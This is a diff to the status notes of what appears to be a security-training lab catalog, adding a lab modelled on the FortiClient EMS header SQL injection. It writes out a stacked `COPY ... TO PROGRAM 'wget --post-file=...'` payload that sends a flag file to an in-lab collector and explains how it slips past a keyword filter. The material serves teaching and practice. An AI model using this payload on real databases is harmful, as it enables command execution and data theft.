@@ -79,6 +79,18 @@ Node-alpine multi-stage with the bundled npm stripped from the runtime; Ruby-sli
 with `pg` compiled from source and the stale default `resolv` gemspec dropped) are
 documented in each lab's `SOLUTION.md` and the `CHANGELOG`.
 
+### batch/track-sqli-d-fortinet (this batch — 1 lab, first OOB/IPS-evasion)
+
+- `sqli-fortinet-ems-fctuid-rce` (**elite**) — abstracts **CVE-2023-48788 (FortiClient EMS)**. Header
+  SQLi (`X-FCTUID`) → stacked `COPY audit_log TO PROGRAM 'wget --post-file=/labflag/flag.txt
+http://oob:9000/x'` (superuser INTENTIONAL; table-source COPY has no `SELECT`, bypassing the naive
+  keyword IPS) → OOB exfil to the in-lab collector sidecar → `GET /oob/received` app-proxy readback →
+  `/solve`. 3-service compose (app + superuser-pg + stdlib http.server collector on the same base
+  image) on 2 networks (edge + `internal:true` backend). Verified live: db no default route (Network
+  unreachable to 1.1.1.1) but db→oob:9000 works. Re-platformed ASP.NET/Windows/MSSQL → Flask/Postgres
+  (Windows containers can't run on Linux; MSSQL blows 512m/300MB). `risk:low` (COPY PROGRAM needs no
+  caps; egress-drop contains). posture all 3 + Trivy gates green, 143 MB, exploit <1 s.
+
 ### batch/track-sqli-d-moveit (this batch — 1 lab, first auth-bypass-by-write)
 
 - `sqli-moveit-header-auth-bypass-chain` (**elite**) — abstracts **CVE-2023-34362 (MOVEit)**. Header SQLi
@@ -123,8 +135,10 @@ documented in each lab's `SOLUTION.md` and the `CHANGELOG`.
 
 ## Scheduled (future batches, Linux-feasible)
 
-**Implemented: 21/25.** The remaining 4 catalog entries are the infeasible-as-
-specified labs in the next section (Windows-container MSSQL/Fortinet/MoVEit and
+**Implemented: 22/25.** The remaining 3 catalog entries are the heavy-tier
+labs (real MSSQL / Oracle / Elasticsearch — each needs a `resource_tier: heavy`
+lane + a new `.github/workflows/heavy-nightly.yml` decoupled from the main CI
+matrix) (Windows-container MSSQL/Fortinet/MoVEit and
 heavy-tier Oracle/Elasticsearch). `sqli-postgres-copy-program-rce-chain` shipped as
 a `risk: low` egress-dropped RCE lab (COPY FROM PROGRAM needs no added caps). Pending the
 operator's charter decision (abstract onto a Linux stack, grant a heavy
@@ -137,7 +151,6 @@ These catalog labs cannot run under the platform's constraints (Linux Docker hos
 re-platform decision** (abstract the vuln class onto a Linux-runnable stack):
 
 - `sqli-mssql-stacked-xp-cmdshell` — specifies **Windows Nano Server** (Windows container; cannot run on a Linux host).
-- `sqli-fortinet-ems-fctuid-rce` — **Windows Server Core** + MSSQL (Windows container); also a §13 CVE-homage.
 - `sqli-oob-dns-oracle-utlhttp` — **Oracle 21c XE** (~2–4 GB image, 60–120 s start; blows size/time gates).
 - `sqli-elasticsearch-dsl-painless` — **Elasticsearch 8.15** (requires >512 MB RAM; won't start under the mem cap).
 
